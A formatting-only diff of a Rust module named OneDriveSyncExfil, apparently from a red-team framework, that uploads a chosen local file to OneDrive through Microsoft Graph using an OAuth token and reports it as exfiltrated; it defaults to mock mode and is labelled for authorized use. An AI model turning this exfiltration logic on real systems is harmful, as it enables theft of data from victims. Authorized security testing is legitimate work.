@@ -27,7 +27,7 @@
 //! - Safe for development and testing
 //! - No real OneDrive access
 
-use anyhow::{anyhow, bail, Context, Result};
+use anyhow::{Context, Result, anyhow, bail};
 use async_trait::async_trait;
 use serde::{Deserialize, Serialize};
 use std::collections::HashMap;
@@ -35,9 +35,11 @@ use std::path::{Path, PathBuf};
 use std::sync::Arc;
 use tokio::fs;
 use tokio::sync::Mutex;
-use tokio::time::{sleep, Duration};
+use tokio::time::{Duration, sleep};
 
-use crate::core::module::{CheckResult, Module, ModuleInfo, ModuleOption, ModuleResult, ModuleType};
+use crate::core::module::{
+    CheckResult, Module, ModuleInfo, ModuleOption, ModuleResult, ModuleType,
+};
 
 /// Microsoft Graph API endpoints
 const GRAPH_UPLOAD_ENDPOINT: &str = "https://graph.microsoft.com/v1.0/me/drive/root:/Backups";
@@ -70,7 +72,12 @@ struct UploadResult {
 /// Abstract Graph API client for testability
 #[async_trait]
 trait GraphApiClient: Send + Sync {
-    async fn upload_file(&self, token: &str, file_path: &Path, remote_name: &str) -> Result<OneDriveItem>;
+    async fn upload_file(
+        &self,
+        token: &str,
+        file_path: &Path,
+        remote_name: &str,
+    ) -> Result<OneDriveItem>;
     async fn create_folder(&self, token: &str, folder_name: &str) -> Result<OneDriveItem>;
 }
 
@@ -81,13 +88,20 @@ struct HttpGraphClient {
 
 impl HttpGraphClient {
     fn new(rate_limit_delay_ms: u64) -> Self {
-        Self { rate_limit_delay_ms }
+        Self {
+            rate_limit_delay_ms,
+        }
     }
 }
 
 #[async_trait]
 impl GraphApiClient for HttpGraphClient {
-    async fn upload_file(&self, token: &str, file_path: &Path, remote_name: &str) -> Result<OneDriveItem> {
+    async fn upload_file(
+        &self,
+        token: &str,
+        file_path: &Path,
+        remote_name: &str,
+    ) -> Result<OneDriveItem> {
         // Read file content
         let content = fs::read(file_path).await.context("Failed to read file")?;
         let file_size = content.len();
@@ -188,9 +202,16 @@ impl MockGraphClient {
 
 #[async_trait]
 impl GraphApiClient for MockGraphClient {
-    async fn upload_file(&self, _token: &str, file_path: &Path, remote_name: &str) -> Result<OneDriveItem> {
+    async fn upload_file(
+        &self,
+        _token: &str,
+        file_path: &Path,
+        remote_name: &str,
+    ) -> Result<OneDriveItem> {
         // Simulate upload without network
-        let metadata = fs::metadata(file_path).await.context("Failed to read file metadata")?;
+        let metadata = fs::metadata(file_path)
+            .await
+            .context("Failed to read file metadata")?;
         let size = metadata.len();
 
         let item = OneDriveItem {
@@ -277,11 +298,16 @@ impl OneDriveSyncExfil {
         };
 
         // Get file size
-        let metadata = fs::metadata(source_path).await.context("Failed to read file metadata")?;
+        let metadata = fs::metadata(source_path)
+            .await
+            .context("Failed to read file metadata")?;
         let size = metadata.len();
 
         // Upload
-        let item = self.client.upload_file(token, source_path, &remote_name).await?;
+        let item = self
+            .client
+            .upload_file(token, source_path, &remote_name)
+            .await?;
 
         let duration_ms = start_time.elapsed().as_millis() as u64;
 
@@ -374,12 +400,18 @@ impl Module for OneDriveSyncExfil {
 
     fn validate(&self) -> Result<()> {
         // Check required options
-        let token = self.options.get("oauth_token").ok_or_else(|| anyhow!("oauth_token required"))?;
+        let token = self
+            .options
+            .get("oauth_token")
+            .ok_or_else(|| anyhow!("oauth_token required"))?;
         if token.is_empty() {
             bail!("oauth_token cannot be empty");
         }
 
-        let source = self.options.get("source_file").ok_or_else(|| anyhow!("source_file required"))?;
+        let source = self
+            .options
+            .get("source_file")
+            .ok_or_else(|| anyhow!("source_file required"))?;
         if source.is_empty() {
             bail!("source_file cannot be empty");
         }
@@ -394,7 +426,11 @@ impl Module for OneDriveSyncExfil {
     }
 
     async fn check(&self) -> Result<CheckResult> {
-        let mock_mode = self.options.get("mock_mode").map(|s| s == "true").unwrap_or(true);
+        let mock_mode = self
+            .options
+            .get("mock_mode")
+            .map(|s| s == "true")
+            .unwrap_or(true);
 
         let mut fingerprint = HashMap::new();
 
@@ -422,23 +458,30 @@ impl Module for OneDriveSyncExfil {
     }
 
     async fn run(&mut self) -> Result<ModuleResult> {
-        let mock_mode = self.options.get("mock_mode").map(|s| s == "true").unwrap_or(true);
+        let mock_mode = self
+            .options
+            .get("mock_mode")
+            .map(|s| s == "true")
+            .unwrap_or(true);
 
         // Switch to real client if not in mock mode
         if !mock_mode {
-            let rate_limit = self.options
+            let rate_limit = self
+                .options
                 .get("rate_limit_ms")
                 .and_then(|s| s.parse::<u64>().ok())
                 .unwrap_or(1000);
             self.client = Arc::new(HttpGraphClient::new(rate_limit));
         }
 
-        let token = self.options
+        let token = self
+            .options
             .get("oauth_token")
             .cloned()
             .ok_or_else(|| anyhow!("oauth_token not set"))?;
 
-        let source = self.options
+        let source = self
+            .options
             .get("source_file")
             .cloned()
             .ok_or_else(|| anyhow!("source_file not set"))?;
@@ -448,17 +491,24 @@ impl Module for OneDriveSyncExfil {
         // Upload file
         let upload_result = self.upload_file(&token, &source_path).await?;
 
-        Ok(ModuleResult::success(
-            format!(
-                "Exfiltrated {} ({} bytes) to OneDrive in {}ms",
-                upload_result.file_name, upload_result.size_bytes, upload_result.upload_duration_ms
-            )
-        )
+        Ok(ModuleResult::success(format!(
+            "Exfiltrated {} ({} bytes) to OneDrive in {}ms",
+            upload_result.file_name, upload_result.size_bytes, upload_result.upload_duration_ms
+        ))
         .with_data("file_name", serde_json::json!(upload_result.file_name))
         .with_data("size_bytes", serde_json::json!(upload_result.size_bytes))
-        .with_data("duration_ms", serde_json::json!(upload_result.upload_duration_ms))
-        .with_data("onedrive_id", serde_json::json!(upload_result.onedrive_id.unwrap_or_default()))
-        .with_data("web_url", serde_json::json!(upload_result.web_url.unwrap_or_default()))
+        .with_data(
+            "duration_ms",
+            serde_json::json!(upload_result.upload_duration_ms),
+        )
+        .with_data(
+            "onedrive_id",
+            serde_json::json!(upload_result.onedrive_id.unwrap_or_default()),
+        )
+        .with_data(
+            "web_url",
+            serde_json::json!(upload_result.web_url.unwrap_or_default()),
+        )
         .with_data("mock_mode", serde_json::json!(mock_mode)))
     }
 
@@ -490,7 +540,9 @@ mod tests {
 
         let mut module = OneDriveSyncExfil::new();
         module.set_option("oauth_token", "mock-token").unwrap();
-        module.set_option("source_file", test_file.to_str().unwrap()).unwrap();
+        module
+            .set_option("source_file", test_file.to_str().unwrap())
+            .unwrap();
         module.set_option("mock_mode", "true").unwrap();
 
         assert!(module.validate().is_ok());
@@ -513,7 +565,9 @@ mod tests {
         assert!(module.validate().is_err());
 
         // Non-existent file
-        module.set_option("source_file", "/nonexistent/file.txt").unwrap();
+        module
+            .set_option("source_file", "/nonexistent/file.txt")
+            .unwrap();
         assert!(module.validate().is_err());
     }
 
@@ -521,7 +575,7 @@ mod tests {
     fn test_module_info() {
         let module = OneDriveSyncExfil::new();
         let info = module.info();
-    assert_eq!(info.name, "onedrive_sync_exfil");
+        assert_eq!(info.name, "onedrive_sync_exfil");
         assert!(info.description.contains("AUTHORIZED"));
     }
 
